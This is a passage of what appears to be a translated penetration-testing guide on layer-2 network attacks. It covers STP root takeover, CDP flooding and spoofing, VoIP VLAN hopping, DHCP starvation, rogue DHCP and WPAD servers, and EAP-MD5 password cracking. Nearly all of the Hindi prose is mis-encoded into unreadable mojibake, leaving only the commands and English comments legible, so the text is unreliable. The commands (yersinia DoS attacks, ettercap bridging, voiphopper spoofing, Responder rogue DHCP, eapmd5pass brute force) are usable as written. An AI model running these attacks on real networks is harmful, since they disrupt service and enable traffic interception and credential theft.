**рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ 2 рд╕реНрд╡рд┐рдЪ рд╕реЗ рдХрдиреЗрдХреНрдЯреЗрдб рд╣реИрдВ, рддреЛ рд╡рд╣ рдирдП рдЯреНрд░реА рдХреА рд░реВрдЯ рдмрди рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрди рд╕реНрд╡рд┐рдЪреЛрдВ рдХреЗ рдмреАрдЪ рд╕рднреА рдЯреНрд░реИрдлрд┐рдХ рдЙрд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛрдЧрд╛** (рдПрдХ MITM рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛)ред
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP рд╣рдорд▓реЗ

рд╕рд┐рд╕реНрдХреЛ рдбрд┐рд╕реНрдХрд╡рд░реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╕рд┐рд╕реНрдХреЛ рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬреЛ рдЙрдиреНрд╣реЗрдВ рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ, **рдЬреАрд╡рд┐рдд рдХреМрди рд╣реИ рдФрд░ рдЙрдирдХреЗ рдкрд╛рд╕ рдХреМрди рд╕реА рд╕реБрд╡рд┐рдзрд╛рдПрдВ рд╣реИрдВ рдЗрд╕реЗ рдЦреЛрдЬрдиреЗ** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

#### рдЬрд╛рдирдХрд╛рд░реА рд╕рдВрдЧреНрд░рд╣рдг <a href="#0e0f" id="0e0f"></a>

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, CDP рд╕рднреА рдЕрдкрдиреЗ рдкреЛрд░реНрдЯреЛрдВ рдХреЛ рдШреЛрд╖рдгрд╛рдПрдВ рднреЗрдЬрддрд╛ рд╣реИред** рд▓реЗрдХрд┐рди рдпрджрд┐ рдХреЛрдИ рдЕрддрд┐рдЪрд╛рд░реА рд╕рдорд╛рди рд╕реНрд╡рд┐рдЪ рдкрд░ рдПрдХ рдкреЛрд░реНрдЯ рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрддрд╛ рд╣реИ? рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдирд┐рдлрд░, рдЪрд╛рд╣реЗ рд╡рд╣ **Wireshark**, **tcpdump** рдпрд╛ **Yersinia** рд╣реЛ, рд╡рд╣ рдЙрдкрдХрд░рдг рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ **рдореВрд▓реНрдпрд╡рд╛рди рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓ рд╕рдХрддрд╛ рд╣реИ**, рдЙрд╕рдХреЗ рдореЙрдбрд▓ рд╕реЗ рд╢реБрд░реВ рд╣реЛрдХрд░ рд╕рд┐рд╕реНрдХреЛ IOS рд╕рдВрд╕реНрдХрд░рдг рддрдХред рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд╣ рд╕рд┐рд╕реНрдХреЛ IOS рдХреЗ рд╕рдорд╛рди рд╕рдВрд╕реНрдХрд░рдг рдХреА рдЧрдгрдирд╛ рдХрд░ рд╕рдХреЗрдЧрд╛ рдФрд░ рдлрд┐рд░ рдЙрд╕реЗ рдЙрд╕рдореЗ рдореМрдЬреВрдж рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЦреЛрдЬреЗрдЧрд╛ред

#### CDP рдмрд╛рдврд╝ рдЖрдХреНрд░рдордг <a href="#0d6a" id="0d6a"></a>

рдЖрдк рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рд┐рд╕реНрдХреЛ рдЙрдкрдХрд░рдгреЛрдВ рдХреА рдирдХрд▓ рдХрд░рдХреЗ рдЙрдкрдХрд░рдг рдореЗрдореЛрд░реА рдХреЛ рдЦрдкрдд рдХрд░рдХреЗ рдПрдХ рд╕рд┐рд╕реНрдХреЛ рд╕реНрд╡рд┐рдЪ рдХреЗ рд▓рд┐рдП рдПрдХ рдбреАрдУрдПрд╕ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
рдлреНрд▓рдбрд┐рдВрдЧ рд╕реАрдбреАрдкреА рдЯреЗрдмрд▓ рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ рд╣рдорд▓рд╛ рд╢реБрд░реВ рдХрд░реЗрдВред рд╕реНрд╡рд┐рдЪ рд╕реАрдкреАрдпреВ рдФрд░ рд╕реАрдбреАрдкреА рдкрдбрд╝реЛрд╕реА рдЯреЗрдмрд▓ рджреЛрдиреЛрдВ рдУрд╡рд░рд▓реЛрдб рд╣реЛ рдЬрд╛рдПрдЧрд╛, рдЬрд┐рд╕рд╕реЗ "рдиреЗрдЯрд╡рд░реНрдХ рд▓рдХреНрд╖реНрдпрд╣реАрдирддрд╛" рд╣реЛрдЧреАред

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### рд╕реАрдбреАрдкреА рдЕрдиреБрд░реВрдкрдг рд╣рдорд▓рд╛
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
рдЖрдк рднреА [**scapy**](https://github.com/secdev/scapy/) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред `scapy/contrib` рдкреИрдХреЗрдЬ рдХреЗ рд╕рд╛рде рдЗрд╕реЗ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдиреЗ рдХрд╛ рдзреНрдпрд╛рди рджреЗрдВред

### VoIP рд╣рдорд▓реЗ

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХрд░реНрдордЪрд╛рд░рд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╡реЙрдпрд╕ рдУрд╡рд░ рдЗрдВрдЯрд░рдиреЗрдЯ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (VoIP) рдлреЛрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдорд┐рдд, рдЖрдзреБрдирд┐рдХ VoIP рдЙрдкрдХрд░рдг рдмрдврд╝рддреЗ рд╣реБрдП IoT рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХреАрдХреГрдд рд╣реЛ рд░рд╣реЗ рд╣реИрдВред рдЕрдм рдХрдИ рдХрд░реНрдордЪрд╛рд░реА рдПрдХ рд╡рд┐рд╢реЗрд╖ рдлреЛрди рдирдВрдмрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджрд░рд╡рд╛рдЬреЗ рдЦреЛрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рдХрдорд░реЗ рдХреЗ рдерд░реНрдореЛрд╕реНрдЯреЗрдЯ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ...

рдЯреВрд▓ [**voiphopper**](http://voiphopper.sourceforge.net) рд╕рд┐рд╕реНрдХреЛ, рдЕрд╡рд╛рдпрд╛, рдиреЙрд░реНрдЯреЗрд▓ рдФрд░ рдЕрд▓рдХрд╛рдЯреЗрд▓-рд▓реБрд╕реЗрдВрдЯ рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдореЗрдВ рдПрдХ VoIP рдлреЛрди рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреА рдирдХрд▓ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЙрди рдЙрдкрдХрд░рдг рдЦреЛрдЬ рдкреНрд░реЛрдЯреЛрдХреЙрд▓реЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрд╡рд╛рдЬ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рд▓рд┐рдП рд╕рд╣реА VLAN ID рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рд╕рд┐рд╕реНрдХреЛ рдбрд┐рд╕реНрдХрд╡рд░реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (CDP), рдбрд╛рдпрдиреЗрдорд┐рдХ рд╣реЛрд╕реНрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (DHCP), рд▓рд┐рдВрдХ рд▓реЗрдпрд░ рдбрд┐рд╕реНрдХрд╡рд░реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдореАрдбрд┐рдпрд╛ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдбрд┐рд╕реНрдХрд╡рд░реА (LLDP-MED) рдФрд░ 802.1Q ARPред

**VoIP Hopper** рддреАрди CDP рдореЛрдб рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред **sniff** рдореЛрдб рдиреЗрдЯрд╡рд░реНрдХ рдкреИрдХреЗрдЯреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ рдФрд░ VLAN ID рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **`-c`** рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ `0` рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВред **spoof** рдореЛрдб рдХрд╕реНрдЯрдо рдкреИрдХреЗрдЯ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ VoIP рдЙрдкрдХрд░рдг рдХреА рддрд░рд╣ рдХреЙрд░реНрдкреЛрд░реЗрдЯ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **`-c`** рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ **`1`** рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВред рдкреВрд░реНрд╡-рдирд┐рд░реНрдорд┐рдд рдкреИрдХреЗрдЯ рдХреЗ рд╕рд╛рде рд╕реНрдкреВрдл рдореЛрдб рд╕рд┐рд╕реНрдХреЛ 7971G-GE IP рдлреЛрди рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рд╣реА рдкреИрдХреЗрдЯ рднреЗрдЬрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **`-c`** рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ **`2`** рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВред

рд╣рдо рдЗрд╕ рдЕрдВрддрд┐рдо рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рдмрд╕реЗ рддреЗрдЬрд╝ рддрд░реАрдХрд╛ рд╣реИред **`-i`** рдкреИрд░рд╛рдореАрдЯрд░ рджреБрд░реНрдШрдЯрдирд╛ рдХрд░реНрддрд╛ рдХрд╛ **рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлрд╝реЗрд╕** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ, рдФрд░ **`-E`** рдкреИрд░рд╛рдореАрдЯрд░ рдирдХрд▓реАрдХреГрдд рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ **VOIP рдЙрдкрдХрд░рдг рдХрд╛ рдирд╛рдо** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред рд╣рдордиреЗ рдирд╛рдо SEP001EEEEEEEEE рдХрд╛ рдЪрдпрди рдХрд┐рдпрд╛ рд╣реИ, рдЬреЛ рд╕рд┐рд╕реНрдХреЛ рдирд╛рдордХрд░рдг рдкреНрд░рд╛рд░реВрдк рдХреЗ рд▓рд┐рдП рд╕рдВрдЧрдд рд╣реИред рдЗрд╕ рдкреНрд░рд╛рд░реВрдк рдореЗрдВ "SEP" рд╢рдмреНрдж рдХреЗ рдмрд╛рдж рдПрдХ MAC рдкрддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдХреЙрд░реНрдкреЛрд░реЗрдЯ рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ, рдЖрдк рд╡реЙрдпрд╕ рдлреЛрди рдХреЗ рдкреАрдЫреЗ рдореИрдХ рд▓реЗрдмрд▓ рдХреЛ рджреЗрдЦрдХрд░ рдПрдХ рдореМрдЬреВрджрд╛ VoIP рдЙрдкрдХрд░рдг рдХреА рдирдХрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ; рдлреЛрди рдХреА рдкреНрд░рджрд░реНрд╢рди рд╕реНрдХреНрд░реАрди рдкрд░ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдмрдЯрди рджрдмрд╛рдХрд░ рдФрд░ рдореЙрдбрд▓ рдЬрд╛рдирдХрд╛рд░реА рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЪрдпрди рдХрд░рдХреЗ; рдпрд╛ рдЕрдкрдиреЗ рд▓реИрдкрдЯреЙрдк рдкрд░ рд╡реЙрдпрд╕ рдЙрдкрдХрд░рдг рдХреА рдИрдерд░рдиреЗрдЯ рдХреЗрдмрд▓ рдЬреЛрдбрд╝рдХрд░ рдФрд░ Wireshark рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдХрд░рдг рдХреЗ CDP рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдЕрд╡рд▓реЛрдХрди рдХрд░рдХреЗред
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
рдпрджрд┐ рдЯреВрд▓ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ **VLAN рдиреЗрдЯрд╡рд░реНрдХ рдЖрдХреНрд░рдордХ рдХреЗ рдЙрдкрдХрд░рдг рдХреЛ рдПрдХ IPv4 рдкрддрд╛ рд╕реМрдВрдкреЗрдЧрд╛**ред

### DHCP рд╣рдорд▓реЗ

#### рдЬрд╛рдБрдЪ
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**рджреЛ рдкреНрд░рдХрд╛рд░ рдХреЗ DoS** DHCP рд╕рд░реНрд╡рд░ рдХреЗ рдЦрд┐рд▓рд╛рдл рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдкрд╣рд▓рд╛ рдкреНрд░рдХрд╛рд░ рдЙрди рд╕рднреА рд╕рдВрднрд╛рд╡рд┐рдд IP рдкрддреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рдирдХрд▓реА рд╣реЛрд╕реНрдЯ рдмрдирд╛рдиреЗ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реЛрддрд╛ рд╣реИред\
рдпрд╣ рд╣рдорд▓рд╛ рдХреЗрд╡рд▓ рддрднреА рдХрд╛рдо рдХрд░реЗрдЧрд╛ рдЬрдм рдЖрдк DHCP рд╕рд░реНрд╡рд░ рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рджреЗрдЦ рд╕рдХреЗрдВ рдФрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ рдкреВрд░рд╛ рдХрд░ рд╕рдХреЗрдВ (**рдЦреЛрдЬреЗрдВ** (рдХрдВрдкреНрдпреВрдЯрд░) --> **рдкреНрд░рд╕реНрддрд╛рд╡** (рд╕рд░реНрд╡рд░) --> **рдЕрдиреБрд░реЛрдз** (рдХрдВрдкреНрдпреВрдЯрд░) --> **ACK** (рд╕рд░реНрд╡рд░))ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрд╣ **рд╡рд╛рдИрдлрд╝рд╛рдИ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ**ред

рдПрдХ рдФрд░ рддрд░реАрдХрд╛ DHCP DoS рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рдХрд░рдиреЗ рдХрд╛ рд╣реИ, рд╕рднреА рд╕рдВрднрд╛рд╡рд┐рдд IP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ **DHCP-RELEASE рдкреИрдХреЗрдЯ рднреЗрдЬрдирд╛**ред рдлрд┐рд░, рд╕рд░реНрд╡рд░ рдХреЛ рд▓рдЧреЗрдЧрд╛ рдХрд┐ рд╕рднреА рдиреЗ IP рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рд╣реИред
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
рдЗрд╕реЗ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рддрд░реАрдХрд╛ рдЯреВрд▓ [DHCPing](https://github.com/kamorin/DHCPig) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред

рдЖрдк рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рднреА рдбреАрдУрдПрд╕ рд╣рдорд▓реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рдирдП рд▓реАрдЬрд╝ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рдЦрддреНрдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдирд╣реАрдВ рджреЗрдВред рдЗрд╕рд▓рд┐рдП рдЬрдм рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рд░реНрд╡рд░ рдлрд┐рд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ, **рдЖрдк рдЕрдЧрд▓реЗ рд╣рдорд▓реЗ рдореЗрдВ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рджреБрд╖реНрдЯ рдорд╛рдиреНрдпрддрд╛рдПрдВ рд╕рд░реНрд╡ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

#### рджреБрд╖реНрдЯ рдорд╛рдиреНрдпрддрд╛рдПрдВ рд╕реЗрдЯ рдХрд░реЗрдВ

рдЖрдк рдПрдХ рджреБрд╖реНрдЯ DHCP рд╕рд░реНрд╡рд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Responder DHCP рд╕реНрдХреНрд░рд┐рдкреНрдЯ (_/usr/share/responder/DHCP.py_) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рджреБрд╖реНрдЯ рдЧреЗрдЯрд╡реЗ рд╕реЗрдЯ рдХрд░рдирд╛ рдЖрджрд░реНрд╢ рдирд╣реАрдВ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд╛рд░рд╛ рдЬреБрдбрд╝рд╛ рд╣реБрдЖ рдХрдиреЗрдХреНрд╢рди рдХреЗрд╡рд▓ рдЖрдзреА-рджреНрд╡рд┐рдкрдХреНрд╖реАрдп рд╣реЛрддрд╛ рд╣реИ (рдЕрд░реНрдерд╛рддреН, рд╣рдо рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реЗ рдирд┐рдХрд▓рдиреЗ рд╡рд╛рд▓реЗ рдкреИрдХреЗрдЯ рдХреИрдкреНрдЪрд░ рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЧреЗрдЯрд╡реЗ рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдирд╣реАрдВ)ред рдЗрд╕рд▓рд┐рдП, рдореИрдВ рд╕рд▓рд╛рд╣ рджреВрдВрдЧрд╛ рдХрд┐ рдЖрдк HTTP рдЯреНрд░реИрдлрд┐рдХ рдФрд░ рд╡рд┐рд╢реЗрд╖рддрдГ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд╖реНрдЯ DNS рдпрд╛ WPAD рд╕рд░реНрд╡рд░ рд╕реЗрдЯ рдХрд░реЗрдВред

| рд╡рд┐рд╡рд░рдг                                 | рдЙрджрд╛рд╣рд░рдг                                                                      |
| ------------------------------------------- | ---------------------------------------------------------------------------- |
| рд╣рдорд╛рд░рд╛ рдЖрдИрдкреА рдкрддрд╛, рдПрдХ рдЧреЗрдЯрд╡реЗ рдХреЗ рд░реВрдк рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ | _-i 10.0.0.100_                                                              |
| рд╕реНрдерд╛рдиреАрдп DNS рдбреЛрдореЗрди рдирд╛рдо (рд╡реИрдХрд▓реНрдкрд┐рдХ)        | _-d example.org_                                                             |
| рдореВрд▓ рд░рд╛рдЙрдЯрд░/рдЧреЗрдЯрд╡реЗ рдХрд╛ рдЖрдИрдкреА рдкрддрд╛   | _-r 10.0.0.1_                                                                |
| рдкреНрд░рд╛рдердорд┐рдХ DNS рд╕рд░реНрд╡рд░ рдХрд╛ рдЖрдИрдкреА рдкрддрд╛               | _-p 10.0.0.100_                                                              |
| рджреНрд╡рд┐рддреАрдпрдХ DNS рд╕рд░реНрд╡рд░ рдХрд╛ рдЖрдИрдкреА рдкрддрд╛ (рд╡реИрдХрд▓реНрдкрд┐рдХ)  | _-s 10.0.0.1_                                                                |
| рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдХрд╛ рдиреЗрдЯрдорд╛рд╕реНрдХ            | _-n 255.255.255.0_                                                           |
| DHCP рдЯреНрд░реИрдлрд┐рдХ рдХреЗ рд▓рд┐рдП рд╕реБрдирдиреЗ рдХреЗ рд▓рд┐рдП рдЗрдВрдЯрд░рдлреЗрд╕ | _-I eth1_                                                                    |
| WPAD рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрддрд╛ (URL)            | _-w тАЬ_[http://10.0.0.100/wpad.dat\nтАЭ](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЧреЗрдЯрд╡реЗ рдЖрдИрдкреА рдкрддреЗ рдХрд╛ рдЫрд▓ рдХрд░реЗрдВ        | -S                                                                           |
| рд╕рднреА DHCP рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдЬрд╡рд╛рдм рджреЗрдВ (рдмрд╣реБрдд рд╢реЛрд░рдЧреБрд▓)   | -R                                                                           |

### **EAP рд╣рдорд▓реЗ**

рдпрд╣рд╛рдВ 802.1X рдХреЗ рдкреНрд░рдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХреБрдЫ рд╣рдорд▓реЗ рддрдХрдиреАрдХреЛрдВ рдХреА рдХреБрдЫ рд╣реИрдВ:

* EAP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдХреНрд░рд┐рдп рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдкрд╛рд╕рд╡рд░реНрдб рдЧреНрд░рд╛рдЗрдВрдбрд┐рдВрдЧ
* рд╡рд┐рдХреГрдд EAP рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде RADIUS рд╕рд░реНрд╡рд░ рдХреЛ рд╣рдорд▓рд╛ рдХрд░рдирд╛ _\*\*_(рд╢реЛрд╖рдг)
* EAP рд╕рдВрджреЗрд╢ рдХреИрдкреНрдЪрд░ рдФрд░ рдСрдлрд╝рд▓рд╛рдЗрди рдкрд╛рд╕рд╡рд░реНрдб рдХреНрд░реИрдХрд┐рдВрдЧ (EAP-MD5 рдФрд░ PEAP)
* EAP-MD5 рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдЯреАрдПрд▓рдПрд╕ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕рддреНрдпрд╛рдкрди рдХреЛ рдЫрд▓рдиреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП
* рд╣рдм рдпрд╛ рд╕рдорд╛рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд╛рдж рджреБрд╖реНрдЯ рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд┐рдХ рдЗрдВрдЬреЗрдХреНрд╢рди

рдпрджрд┐ рд╣рдорд▓рд╡рд╛рд░ рд╡реНрдпрдХреНрддрд┐ рдкреАрдбрд╝рд┐рдд рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ рд╣реИ, рддреЛ рд╡рд╣ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ EAP-MD5 рдореЗрдВ рдЧрд┐рд░рд╛рдпрд╛ рдЬрд╛рдП рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХреИрдкреНрдЪрд░ рдХрд┐рдпрд╛ рдЬрд╛рдПред рдлрд┐рд░, рдЙрд╕реЗ рдЗрд╕реЗ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```
eapmd5pass тАУr pcap.dump тАУw /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) рд╣рдорд▓реЗ <a href="#6196" id="6196"></a>

